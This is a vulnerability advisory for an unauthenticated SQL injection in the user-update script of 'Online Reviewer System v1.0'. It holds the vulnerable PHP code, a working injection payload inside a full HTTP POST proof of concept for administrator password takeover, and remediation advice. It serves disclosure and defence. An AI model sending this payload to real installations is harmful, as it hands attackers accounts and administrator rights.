# Unauthenticated-SQL-Injection-in-Online-Reviewer-System

## 1. Vulnerability Overview
- **Vulnerability Type:** SQL Injection (SQLi) - Unauthenticated
- **Product:** Online Reviewer System
- **Version:** v1.0
- **Vendor:** Fabian Ros (Code-Projects)
- **Software Link:** [(https://code-projects.org/online-reviewer-system-in-php-with-source-code/)](https://code-projects.org/online-reviewer-system-in-php-with-source-code/)
- **Severity:** Critical 

## 2. Description
A Critical Unauthenticated SQL Injection vulnerability exists in the "Online Reviewer System v1.0" within the user update logic (btn_functions.php).

The application directly interpolates multiple unsanitized user inputs into an **UPDATE** SQL statement. Every parameter in this request is vulnerable. An attacker can exploit this flaw by sending a crafted HTTP POST request entirely unauthenticated—requiring no valid session, no cookies, and no prior access credentials of any kind.

By injecting SQL comment syntax `(-- -)` into any of the parameters (e.g., password), the attacker can truncate the original `WHERE user_id = '$user_id'` clause that normally relies on session data. When the WHERE clause is neutralized, the database applies the UPDATE operation to every single row in the users table. This allows a complete Mass Account Takeover (Mass ATO). The attacker can simultaneously overwrite the usernames, passwords, and privileges of all users in the system—including Administrators—without needing to know or guess any specific user IDs.


## 3. Root Cause Analysis
The vulnerability is located in `/reviewer/system/system/admins/manage/users/btn_functions.php`.

The root cause of this vulnerability lies in the dangerous combination of unsanitized input interpolation and a structural flaw that allows attackers to logically bypass the system's intended authentication mechanism.

In `btn_functions.php` (Lines ~64-76):
```php
// The system attempts to enforce authorization by relying on the session
$user_id =$_SESSION['user_id']; 
$password =$_REQUEST['password'];

// ...
$stmt = "UPDATE users 
SET usertype_id = '$usertype_id',
// ...
password = '$password' WHERE user_id = '$user_id' ";

 if($conn->exec($stmt)==true){
  header("location: index.php");
 }
```
The developer intended to secure this endpoint by appending `WHERE user_id = '$user_id'` at the end of the query. Under normal circumstances, because this $user_id is fetched strictly from the active session `($_SESSION['user_id'])`, it acts as the primary authorization barrier.

However, a fatal flaw arises from concatenating user input directly into the SQL string without parameterization. By injecting an SQL comment sequence `(-- -)` into the $password parameter, an attacker forcefully truncates the query during execution, effectively erasing the WHERE `user_id = '$user_id'` clause entirely.

Since this specific clause is the sole mechanism tying the database operation to an authenticated user session, its removal renders the system's cookie validation completely useless. This logical short-circuit strips away all authorization barriers, exposing the endpoint as a Critical, zero-click unauthenticated attack vector that grants any anonymous attacker absolute write access to the database.

## 4. Proof of Concept (PoC)
### Step 1: Crafting the Payload
The attacker injects a malicious payload into the password parameter. The payload uses inline comments `(/**/)` to bypass potential space filters and completely comments out the original session-based WHERE clause. The attacker can either target a specific known ID or remove the condition entirely to overwrite all accounts.

**Targeted Payload** : `hacked12'/**/WHERE/**/user_id=25/**/-- -`

### Step 2: Executing the Unauthenticated Request
The following HTTP POST request is sent to the server. Notice the absence of the `Cookie: PHPSESSID=...` header, proving that no prior authentication is required.

Malicious HTTP Request:

```http
POST /reviewer/system/system/admins/manage/users/btn_functions.php HTTP/1.1
Host: YOUR_TARGET_IP
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 153
Origin: http://YOUR_TARGET_IP
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

usertype_id=1&firstname=admin&middlename=admin&lastname=admin&username=admin&password=hacked12'/**/WHERE/**/user_id=25/**/-- -&btnUpdateUser=Save+changes
```

### Step 3: Server Response
The server processes the injected query and returns an HTTP/1.1 302 Found redirect to index.php. The database executes the manipulated query, successfully altering the target data.

<img width="927" height="655" alt="Screenshot_39" src="https://github.com/user-attachments/assets/6fe7fc9a-87c4-4958-b92e-88cbeaf13eb9" />

Following the redirect, the server returns a 200 OK, confirming the request was processed without throwing database syntax errors.

<img width="925" height="651" alt="Screenshot_40" src="https://github.com/user-attachments/assets/05d24275-9ba9-464f-a561-3447fe91a0ea" />

### Step 4: Verification of Account Takeover
Logging into the application or checking the database confirms the payload successfully executed. The password for the targeted administrator account (e.g., user_id=25) has been forcefully changed to

<img width="1919" height="598" alt="Screenshot_41" src="https://github.com/user-attachments/assets/d047602e-21cb-46b5-b972-4d1350dcb87c" />


## 5. Impact
- **Mass Account Takeover (Mass ATO)**: By omitting a targeted user_id in the injected payload, an unauthenticated attacker can overwrite the credentials and roles of every single user in the database simultaneously.

- **Absolute Privilege Escalation**: An attacker can arbitrarily grant themselves Administrator privileges by modifying the usertype_id and user_type parameters during the injection.

- **Zero-Click Unauthenticated Exploitation**: Because the attack neutralizes the session dependency, it requires no prior credentials, no user interaction, and can be easily automated for mass exploitation across any exposed instances of the software.

- **Data Integrity Destruction**: The complete bypass of the original WHERE clause allows indiscriminate modification of the users table, destroying the integrity of legitimate user data.

## 6. Remediation
- **Implement Prepared Statements**: Rewrite the database interaction to use parameterized queries (via PDO or MySQLi). Never concatenate user input `($_REQUEST)` directly into SQL strings.

- **Strict Authentication Validation**: Explicitly verify the existence and validity of `$_SESSION['user_id']` at the very beginning of the script. If the session is invalid or missing, immediately terminate the execution using exit(); or redirect the user before evaluating any HTTP POST data.

- **Input Validation & Sanitization**: Enforce strict type casting for all parameters (e.g., ensuring usertype_id only accepts expected integers) and reject any requests containing unexpected SQL metacharacters.

## 7. Disclosure Timeline
- Sep 09, 2026: Vulnerability discovered.
- Sep 09, 2026: Public disclosure and CVE request submitted (No contact details for the author could be located. Technical details and PoC are fully documented in the provided GitHub).

 
